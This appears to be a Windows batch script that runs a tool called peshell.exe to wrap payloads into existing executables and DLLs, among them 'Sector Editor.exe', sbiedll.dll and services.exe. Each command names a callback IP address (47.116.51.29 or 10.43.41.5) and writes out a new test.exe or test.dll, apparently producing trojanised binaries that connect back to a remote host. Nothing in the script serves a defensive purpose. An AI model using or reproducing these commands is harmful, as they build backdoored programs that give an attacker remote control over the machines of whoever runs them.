
rem peshell.exe -re "Sector Editor.exe" -p 47.116.51.29 test20190401 -o test.exe
rem peshell.exe -rd sbiedll.dll -p 47.116.51.29 test20190401 -o test.dll

peshell.exe -b services.exe qmnetworkmgr.dll -p 10.43.41.5 mytest -o test.exe


pause
